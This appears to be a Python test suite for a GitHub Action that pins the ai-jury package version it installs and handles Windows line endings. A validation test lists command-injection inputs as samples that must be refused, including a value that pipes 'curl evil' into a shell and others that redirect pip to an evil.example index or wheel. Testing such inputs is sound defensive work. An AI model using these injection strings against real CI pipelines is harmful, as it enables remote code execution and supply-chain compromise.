"""A ref of the GitHub Action pins the ai-jury it installs (#867).

`version:` defaulted to the empty string and empty meant `pip install ai-jury`, the
newest release: `uses: berkayturanci/ai-jury@v1.19.1` pinned the YAML and not the
package that ran. The default is now the version the Action's own tree declares,
worked out by `scripts/action_install_spec.py`. Driven through Python rather than
through the shell step, because this suite runs on the Windows matrix leg too.
"""

from __future__ import annotations

import contextlib
import importlib.util
import io
import os
import re
import shutil
import subprocess
import sys
import tempfile
import tomllib
import unittest
from pathlib import Path

from ai_jury import __version__

REPO_ROOT = Path(__file__).resolve().parent.parent
SCRIPT = REPO_ROOT / "scripts" / "action_install_spec.py"


class _Loaded(unittest.TestCase):
    def setUp(self):
        self.assertTrue(
            SCRIPT.is_file(),
            "scripts/action_install_spec.py is missing: nothing pins the package the "
            "Action installs to the Action's own ref",
        )
        spec = importlib.util.spec_from_file_location("action_install_spec", SCRIPT)
        self.mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(self.mod)
        self.pyproject = (REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8")


class TheDefaultIsTheActionsOwnRelease(_Loaded):
    def test_an_unset_version_pins_what_this_tree_declares(self):
        declared = tomllib.loads(self.pyproject)["project"]["version"]
        self.assertEqual(self.mod.requirement("", self.pyproject), f"ai-jury=={declared}")
        # …which is the package this tree is: the release flow keeps them equal.
        self.assertEqual(declared, __version__)

    def test_a_blank_value_is_the_default_too(self):
        """An unset repository variable passed through `version:` arrives as ""."""
        self.assertEqual(self.mod.requirement("  ", self.pyproject), f"ai-jury=={__version__}")

    def test_the_script_run_as_the_action_runs_it_prints_the_pin(self):
        env = {k: v for k, v in os.environ.items() if k != "INPUT_VERSION"}
        env.update(GITHUB_ACTION_PATH=str(REPO_ROOT), INPUT_VERSION="")
        done = subprocess.run(
            [sys.executable, str(SCRIPT)],
            env=env,
            capture_output=True,
            text=True,
            check=False,
        )
        self.assertEqual((done.returncode, done.stdout.strip()), (0, f"ai-jury=={__version__}"))

    def test_the_actions_own_pyproject_wins_over_the_callers(self):
        """In a caller's workflow the step runs in the caller's workspace, which may
        have a pyproject.toml of its own (#909). Here the Action's directory, the
        working directory and `GITHUB_WORKSPACE` are three different trees, each
        declaring its own version, so only a read of `GITHUB_ACTION_PATH` prints the
        Action's."""
        with tempfile.TemporaryDirectory() as root:
            trees = {}
            for name, version in (("action", "9.8.7"), ("workspace", "0.0.1"), ("cwd", "0.0.2")):
                trees[name] = Path(root, name)
                trees[name].mkdir()
                (trees[name] / "pyproject.toml").write_text(
                    f'[project]\nname = "ai-jury"\nversion = "{version}"\n', encoding="utf-8"
                )
            env = {k: v for k, v in os.environ.items() if k != "INPUT_VERSION"}
            env.update(
                GITHUB_ACTION_PATH=str(trees["action"]),
                GITHUB_WORKSPACE=str(trees["workspace"]),
                INPUT_VERSION="",
            )
            done = subprocess.run(
                [sys.executable, str(SCRIPT)],
                cwd=trees["cwd"],
                env=env,
                capture_output=True,
                text=True,
                check=False,
            )
        self.assertEqual((done.returncode, done.stdout), (0, "ai-jury==9.8.7"), done.stderr)

    def test_no_readable_pyproject_fails_rather_than_installing_the_newest(self):
        """Falling back to `pip install ai-jury` is the bug; say so and stop."""
        with self.assertRaises(self.mod.SpecError):
            self.mod.requirement("", None)
        for broken in ("[project]\nname = 'x'\n", "not toml [", "[project]\nversion = 3\n"):
            with self.subTest(pyproject=broken), self.assertRaises(self.mod.SpecError):
                self.mod.requirement("", broken)
        with tempfile.TemporaryDirectory() as empty:
            err = io.StringIO()
            with contextlib.redirect_stderr(err), contextlib.redirect_stdout(io.StringIO()):
                code = self.mod.main({"GITHUB_ACTION_PATH": empty, "INPUT_VERSION": ""})
        self.assertEqual(code, 2)
        self.assertIn("version:", err.getvalue())
        with contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(self.mod.main({}), 2)


class AnExplicitVersionStillWins(_Loaded):
    def test_a_release_number_is_installed_as_written(self):
        for value, spec in (
            ("1.19.1", "ai-jury==1.19.1"),
            (" 1.19.1 ", "ai-jury==1.19.1"),
            ("v1.19.1", "ai-jury==v1.19.1"),
            ("2.0.0rc1", "ai-jury==2.0.0rc1"),
            ("1.20.1.post1", "ai-jury==1.20.1.post1"),
        ):
            with self.subTest(value=value):
                self.assertEqual(self.mod.requirement(value, self.pyproject), spec)

    def test_latest_restores_the_unpinned_install_by_name(self):
        self.assertEqual(self.mod.requirement("latest", self.pyproject), "ai-jury")

    def test_main_prints_the_explicit_pin(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = self.mod.main({"INPUT_VERSION": "1.19.1", "GITHUB_ACTION_PATH": ""})
        self.assertEqual((code, out.getvalue().strip()), (0, "ai-jury==1.19.1"))


class TheSpecCarriesNoLineEnding(_Loaded):
    """windows-latest: `print` writes "\\r\\n", and `$(...)` strips only the "\\n".

    The CR then rides into `pip install "ai-jury==X\\r"`, which pip rejects, so the
    step failed on every Windows runner before anything was installed.
    """

    def test_the_output_is_the_bare_requirement(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            self.mod.main({"INPUT_VERSION": "", "GITHUB_ACTION_PATH": str(REPO_ROOT)})
        self.assertEqual(out.getvalue(), f"ai-jury=={__version__}")

    def test_a_windows_stdout_gets_no_carriage_return(self):
        raw = io.BytesIO()
        windows = io.TextIOWrapper(raw, encoding="utf-8", newline="\r\n")
        with contextlib.redirect_stdout(windows):
            code = self.mod.main({"INPUT_VERSION": "1.19.1", "GITHUB_ACTION_PATH": ""})
        windows.flush()
        self.assertEqual((code, raw.getvalue()), (0, b"ai-jury==1.19.1"))

    def test_the_script_run_as_a_process_writes_exactly_the_requirement(self):
        env = dict(os.environ, INPUT_VERSION="", GITHUB_ACTION_PATH=str(REPO_ROOT))
        done = subprocess.run(
            [sys.executable, str(SCRIPT)], env=env, capture_output=True, check=False
        )
        self.assertEqual((done.returncode, done.stdout), (0, f"ai-jury=={__version__}".encode()))

    def test_a_value_that_is_not_a_version_is_refused(self):
        """Caller-supplied, and it becomes part of a pip argument."""
        for value in (
            '1.0"; curl evil | sh; "',
            "1.0 --index-url https://evil.example/simple",
            ">=1.0",
            "1.0; python_version>'3'",
            "ai-jury @ https://evil.example/x.whl",
            "1.0\n--pre",
            "*",
            "v",
            "1.0.",
            "\u0661.0",  # ARABIC-INDIC DIGIT ONE: `\d` matches it, `[0-9]` does not
            "1.\u0660",
        ):
            with self.subTest(value=value), self.assertRaises(self.mod.SpecError):
                self.mod.requirement(value, self.pyproject)


class TheActionUsesIt(unittest.TestCase):
    def setUp(self):
        self.text = (REPO_ROOT / "action.yml").read_text(encoding="utf-8")
        self.install = self.text.split("- name: Install ai-jury", 1)[1].split("- name:", 1)[0]

    def test_the_install_step_asks_the_script_and_installs_its_answer(self):
        self.assertIn('python "$GITHUB_ACTION_PATH/scripts/action_install_spec.py"', self.install)
        self.assertIn('python -m pip install "$SPEC"', self.install)
        self.assertIn("INPUT_VERSION: ${{ inputs.version }}", self.install)

    def test_no_unpinned_install_is_left_in_the_step(self):
        self.assertNotIn("pip install ai-jury\n", self.install)

    def test_the_input_documents_the_new_default(self):
        block = self.text.split("\n  version:", 1)[1].split("\nruns:", 1)[0]
        self.assertNotIn("defaults to latest", block)
        self.assertIn("pyproject.toml", block)

    def test_a_failed_install_names_the_way_out(self):
        """pip's own error does not mention `version:`; the step must (#898 review).

        Between a version bump and its PyPI publication a branch or SHA ref pins
        a release that does not exist yet.
        """
        guard = 'if ! python -m pip install "$SPEC"; then'
        self.assertIn(guard, self.install)
        branch = self.install.split(guard, 1)[1].split("fi", 1)[0]
        hint = next((line for line in branch.splitlines() if "echo" in line), "")
        self.assertIn("version: latest", hint)
        self.assertIn("released number", hint)
        self.assertTrue(hint.rstrip().endswith(">&2"), hint)
        self.assertNotIn("${{", hint)
        self.assertNotIn("::error::", hint)
        self.assertIn("exit 1", branch)

    def _run_body(self, pip_exit: int, crlf: bool = False) -> subprocess.CompletedProcess:
        """The step's real `run:` body, with `python -m pip` stubbed out.

        The stub records the requirement pip was handed in ``self.pip_arg``. With
        *crlf*, every other `python` call has its output re-terminated with
        "\\r\\n" — what `print` does on a Windows runner — so the step's own
        handling of a CR is tested on a POSIX machine.
        """
        lines = self.install.split("      run: |\n", 1)[1].splitlines()
        body = "\n".join(line[8:] for line in lines if line.startswith("        ") or not line)
        stub = tempfile.TemporaryDirectory()
        self.addCleanup(stub.cleanup)
        python = Path(stub.name) / "python"
        self.pip_arg = Path(stub.name) / "pip-arg"
        real = f'exec "{sys.executable}" "$@"\n'
        if crlf:
            real = f'out=$("{sys.executable}" "$@") || exit $?\nprintf \'%s\\r\\n\' "$out"\n'
        python.write_text(
            "#!/bin/sh\n"
            'if [ "$1" = "-m" ] && [ "$2" = "pip" ]; then\n'
            f"  printf '%s' \"$4\" > '{self.pip_arg}'\n"
            f"  echo 'ERROR: No matching distribution' >&2; exit {pip_exit}\n"
            "fi\n" + real,
            encoding="utf-8",
        )
        python.chmod(0o755)
        env = dict(os.environ, INPUT_VERSION="", GITHUB_ACTION_PATH=str(REPO_ROOT))
        env["PATH"] = stub.name + os.pathsep + env.get("PATH", "")
        return subprocess.run(
            ["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", body],
            env=env,
            capture_output=True,
            text=True,
            check=False,
        )

    @unittest.skipIf(os.name == "nt" or shutil.which("bash") is None, "needs a POSIX bash")
    def test_the_step_prints_the_hint_when_pip_fails(self):
        done = self._run_body(pip_exit=1)
        self.assertEqual(done.returncode, 1, done.stderr)
        self.assertIn(f"ai-jury=={__version__} could not be installed", done.stderr)
        self.assertIn("pass version: latest or a released number", done.stderr)

    @unittest.skipIf(os.name == "nt" or shutil.which("bash") is None, "needs a POSIX bash")
    def test_the_step_is_quiet_when_pip_succeeds(self):
        done = self._run_body(pip_exit=0)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertNotIn("could not be installed", done.stderr)
        self.assertEqual(self.pip_arg.read_bytes(), f"ai-jury=={__version__}".encode())

    @unittest.skipIf(os.name == "nt" or shutil.which("bash") is None, "needs a POSIX bash")
    def test_the_step_strips_a_windows_carriage_return(self):
        """A CR left on `$SPEC` makes pip reject the requirement on windows-latest."""
        done = self._run_body(pip_exit=0, crlf=True)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertEqual(self.pip_arg.read_bytes(), f"ai-jury=={__version__}".encode())


#: The sentence every surface that documents the default must carry (#898 review).
BRANCH_WINDOW = (
    "A branch or SHA ref installs the version its own tree declares, and fails until "
    "that release is on PyPI; pass version: latest or a released number"
)


class TheBranchWindowIsDocumented(unittest.TestCase):
    def test_each_surface_says_how_a_branch_ref_fails_and_what_to_pass(self):
        for surface in ("README.md", "docs/cookbook.md", "action.yml"):
            with self.subTest(surface=surface):
                text = (REPO_ROOT / surface).read_text(encoding="utf-8")
                if surface == "action.yml":
                    # The input's own description, not the install step's hint,
                    # which carries the same words.
                    text = text.split("\n  version:", 1)[1].split("\nruns:", 1)[0]
                flat = re.sub(r"\s+", " ", text.replace("`", ""))
                self.assertIn(BRANCH_WINDOW, flat)

    def test_no_surface_claims_the_filter_checks_a_release_number(self):
        """It is a character-class safety filter; pip validates what passes it."""
        for surface in ("action.yml", "CHANGELOG.md", "scripts/action_install_spec.py"):
            with self.subTest(surface=surface):
                text = (REPO_ROOT / surface).read_text(encoding="utf-8")
                self.assertNotIn("must be a release number", text)


class TheReleaseFlowKeepsThePinExact(unittest.TestCase):
    """The default is exact only because of two properties of publish.yml."""

    def setUp(self):
        self.text = (REPO_ROOT / ".github" / "workflows" / "publish.yml").read_text(
            encoding="utf-8"
        )

    def test_a_tag_that_disagrees_with_pyproject_is_not_published(self):
        self.assertIn("Verify tag matches pyproject", self.text)
        self.assertIn("must match", self.text)

    def test_the_major_alias_moves_only_after_the_release_is_verified(self):
        job = self.text.split("\n  major-tag:", 1)[1]
        self.assertIn("needs: [build-n-publish, verify]", job.split("steps:", 1)[0])


if __name__ == "__main__":
    unittest.main()
